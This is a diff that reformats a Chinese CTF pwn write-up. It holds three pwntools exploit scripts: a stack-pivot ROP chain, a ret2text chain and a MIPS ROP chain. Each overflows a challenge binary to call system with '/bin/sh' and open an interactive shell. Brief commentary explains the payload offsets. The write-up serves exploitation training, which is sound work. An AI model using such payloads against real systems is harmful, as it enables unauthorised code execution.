@@ -9,244 +9,37 @@
 
 
 ```
-
-from
-
-pwn
-
-import
-
-*
-
-from
-
-LibcSearcher
-
-import
-
-LibcSearcher
-
-from
-
-ctypes
-
-import
-
-*
-
-context
-(
-os
-=
-'linux'
-,
-
-arch
-=
-'i386'
-,
-log_level
-
-=
-
-'debug'
-)
-
-context
-.
-terminal
-
-=
-
-'wt.exe -d . wsl.exe -d Ubuntu'
-.
-split
-()
-
-host
-
-=
-
-'gz.imxbt.cn'
-
-post
-
-=
-
-20998
-
+from pwn import *
+from LibcSearcher import LibcSearcher
+from ctypes import *
+context(os='linux', arch='i386',log_level = 'debug')
+context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
+host = 'gz.imxbt.cn'
+post = 20998
 #p = process('./pwn')
-
-p
-
-=
-
-remote
-(
-host
-,
-post
-)
-
-elf
-
-=
-
-ELF
-(
-'./pwn'
-)
-
+p = remote(host,post)
+elf = ELF('./pwn')
 #libc = ELF('./pwn')
-
 #gdb.attach(p)
 
-pop_rdi
+pop_rdi = 0x00000000004018e5
+leave = 0x0000000000401393
+sys = 0x000000000401130
+read = 0x0000000004018A8
 
-=
-
-0x00000000004018e5
-
-leave
-
-=
-
-0x0000000000401393
-
-sys
-
-=
-
-0x000000000401130
-
-read
-
-=
-
-0x0000000004018A8
-
-p
-.
-sendline
-(
-b
-' '
-)
-
-p
-.
-sendline
-(
-b
-'4'
-)
-
-p
-.
-sendline
-(
-b
-'1'
-)
-
-payload
-
-=
-
-b
-'a'
-*
-0x40
-+
-p64
-(
-elf
-.
-bss
-(
-0x408
-))
-+
-p64
-(
-read
-)
-
-pause
-()
-
-p
-.
-send
-(
-payload
-)
-
-pause
-()
-
-payload2
-
-=
-
-b
-'/bin/sh
-\x00
-'
-*
-0x8
-+
-p64
-(
-0
-)
-+
-p64
-(
-pop_rdi
-)
-+
-p64
-(
-elf
-.
-bss
-(
-0x400
--
-0x20
-))
-+
-p64
-(
-sys
-)
-
-pause
-()
-
-p
-.
-send
-(
-payload2
-)
-
-pause
-()
-
-p
-.
-sendline
-(
-'exec 1>&0'
-)
-
-p
-.
-interactive
-()
-
+p.sendline(b' ')
+p.sendline(b'4')
+p.sendline(b'1')
+payload = b'a'*0x40+p64(elf.bss(0x408))+p64(read)
+pause()
+p.send(payload)
+pause()
+payload2 = b'/bin/sh\x00'*0x8+p64(0)+p64(pop_rdi)+p64(elf.bss(0x400-0x20))+p64(sys)
+pause()
+p.send(payload2)
+pause()
+p.sendline('exec 1>&0')
+p.interactive()
 ```
 
 前面抽卡那里没什么问题，直接跳过
@@ -259,30 +52,7 @@ interactive
 
 
 ```
-
-payload
-
-=
-
-b
-'a'
-*
-0x40
-+
-p64
-(
-elf
-.
-bss
-(
-0x408
-))
-+
-p64
-(
-read
-)
-
+payload = b'a'*0x40+p64(elf.bss(0x408))+p64(read)
 ```
 
 `elf.bss(offset)`函数：返回值为`int`,为`.bss`段的地址，加上特定的offset。在这里就是返回到`bss段+0x408`的位置
@@ -293,44 +63,7 @@ read
 
 
 ```
-
-payload2
-
-=
-
-b
-'/bin/sh
-\x00
-'
-*
-0x8
-+
-p64
-(
-0
-)
-+
-p64
-(
-pop_rdi
-)
-+
-p64
-(
-elf
-.
-bss
-(
-0x400
--
-0x20
-))
-+
-p64
-(
-sys
-)
-
+payload2 = b'/bin/sh\x00'*0x8+p64(0)+p64(pop_rdi)+p64(elf.bss(0x400-0x20))+p64(sys)
 ```
 
 接下来因为调用的还是这个`read(0,s,0x60)`，所以先填充0x40字节的`/bin/sh\x00`到bss段，接下来再次覆盖rbp为0，执行pop\_rdi，弹出bss段+0x400-0x20处的内容
@@ -339,274 +72,47 @@ sys
 ### 官方ret2text解
 
 
-```
-
-from
-
-pwn
-
-import
-
-*
-
-from
-
-LibcSearcher
-
-import
-
-LibcSearcher
-
-from
-
-ctypes
-
-import
-
-*
-
-context
-(
-os
-=
-'linux'
-,
-
-arch
-=
-'amd64'
-,
-log_level
-
-=
-
-'debug'
-)
-
-context
-.
-terminal
-
-=
-
-'wt.exe -d . wsl.exe -d Ubuntu'
-.
-split
-()
-
-host
-
-=
-
-'gz.imxbt.cn'
-
-post
-
-=
-
-20476
-
-p
-
-=
-
-process
-(
-'./pwn'
-)
-
+```python
+from pwn import *
+from LibcSearcher import LibcSearcher
+from ctypes import *
+context(os='linux', arch='amd64',log_level = 'debug')
+context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
+host = 'gz.imxbt.cn'
+post = 20476
+p = process('./pwn')
 #p = remote(host,post)
-
-elf
-
-=
-
-ELF
-(
-'./pwn'
-)
-
+elf = ELF('./pwn')
 #libc = ELF('./pwn')
+gdb.attach(p)
 
-gdb
-.
-attach
-(
-p
-)
-
-pop_rdi
-
-=
-
-0x00000000004018e5
-
-count
-
-=
-
-0x000000000405BCC
-
-sys
-
-=
-
-0x0000000004018FC
-
-
+pop_rdi = 0x00000000004018e5
+count = 0x000000000405BCC
+sys = 0x0000000004018FC
 # sh p64(26739)
+payload = b'a'*0x48+p64(pop_rdi)+p64(count)+p64(sys)
 
-payload
+def ck(n):
+    p.recv()
+    p.sendline(b'3')
+    p.recv()
+    p.sendline(str(n).encode())
+    p.sendline(b'\n')
 
-=
+p.sendline(b'a')
+ck(10000)
+ck(10000)
+ck(6739)
 
-b
-'a'
-*
-0x48
-+
-p64
-(
-pop_rdi
-)
-+
-p64
-(
-count
-)
-+
-p64
-(
-sys
-)
-
-def
-
-ck
-(
-n
-):
-
-
-p
-.
-recv
-()
-
-
-p
-.
-sendline
-(
-b
-'3'
-)
-
-
-p
-.
-recv
-()
-
-
-p
-.
-sendline
-(
-str
-(
-n
-)
-.
-encode
-())
-
-
-p
-.
-sendline
-(
-b
-'
-\n
-'
-)
-
-p
-.
-sendline
-(
-b
-'a'
-)
-
-ck
-(
-10000
-)
-
-ck
-(
-10000
-)
-
-ck
-(
-6739
-)
-
-p
-.
-recv
-()
-
-p
-.
-sendline
-(
-b
-'4'
-)
-
-p
-.
-recv
-()
-
-p
-.
-sendline
-(
-b
-'1'
-)
-
-pause
-()
-
-p
-.
-sendline
-(
-payload
-)
-
-pause
-()
-
-p
-.
-sendline
-(
-b
-'exec 1>&2'
-)
-
-p
-.
-interactive
-()
-
+p.recv()
+p.sendline(b'4')
+p.recv()
+p.sendline(b'1')
+pause()
+p.sendline(payload)
+pause()
+p.sendline(b'exec 1>&2')
+p.interactive()
 ```
 
 ![image-20250411163332817.png](../../images/image-20250411163332817.png)
@@ -621,95 +127,12 @@ interactive
 
 
 ```
-
-❯
-
-python3
-
-Python
-
-3.12.3
-
-(
-main
-,
-
-Feb
-
-4
-
-2025
-,
-
-14
-:
-48
-:
-35
-)
-
-[
-GCC
-
-13.3.0
-]
-
-on
-
-linux
-
-Type
-
-"help"
-,
-
-"copyright"
-,
-
-"credits"
-
-or
-
-"license"
-
-for
-
-more
-
-information
-.
-
->>>
-
-from
-
-pwn
-
-import
-
-*
-
->>>
-
-print
-(
-u64
-(
-b
-'sh'
-.
-ljust
-(
-8
-,
-b
-'
-\x00
-'
-)))
-
+❯ python3
+Python 3.12.3 (main, Feb  4 2025, 14:48:35) [GCC 13.3.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> from pwn import *
+>>> print(u64(b'sh'.ljust(8,b'\x00')))
 26739
-
 ```
 
 所以，后面就很简单了
@@ -723,167 +146,26 @@ mips架构，但是简单栈溢出，甚至有gadget
 
 
 ```
-
-from
-
-pwn
-
-import
-
-*
-
-from
-
-LibcSearcher
-
-import
-
-LibcSearcher
-
-from
-
-ctypes
-
-import
-
-*
-
-context
-(
-os
-=
-'linux'
-,
-
-arch
-=
-'i386'
-,
-log_level
-
-=
-
-'debug'
-)
-
-context
-.
-terminal
-
-=
-
-'wt.exe -d . wsl.exe -d Ubuntu'
-.
-split
-()
-
-host
-
-=
-
-'gz.imxbt.cn'
-
-post
-
-=
-
-20860
-
+from pwn import *
+from LibcSearcher import LibcSearcher
+from ctypes import *
+context(os='linux', arch='i386',log_level = 'debug')
+context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
+host = 'gz.imxbt.cn'
+post = 20860
 #p = process('./pwn')
-
-p
-
-=
-
-remote
-(
-host
-,
-post
-)
-
-elf
-
-=
-
-ELF
-(
-'./pwn'
-)
-
+p = remote(host,post)
+elf = ELF('./pwn')
 #libc = ELF('./pwn')
-
 #gdb.attach(p)
 
-gadget
-
-=
-
-0x0400A20
-
-binsh
-
-=
-
-0x0411010
-
-door
-
-=
-
-0x409c8
-
-sys
-
-=
-0x0400B70
-
-payload
-
-=
-
-b
-'a'
-*
-32
-+
-b
-'a'
-*
-0x4
-+
-p32
-(
-gadget
-)
-+
-p32
-(
-0
-)
-+
-p32
-(
-sys
-)
-+
-p32
-(
-binsh
-)
-
-p
-.
-sendline
-(
-payload
-)
-
-p
-.
-interactive
-()
-
+gadget = 0x0400A20
+binsh = 0x0411010
+door = 0x409c8
+sys  =0x0400B70
+payload = b'a'*32+b'a'*0x4+p32(gadget)+p32(0)+p32(sys)+p32(binsh)
+p.sendline(payload)
+p.interactive()
 ```
 
 ![image-20250411164446671.png](../../images/image-20250411164446671.png)
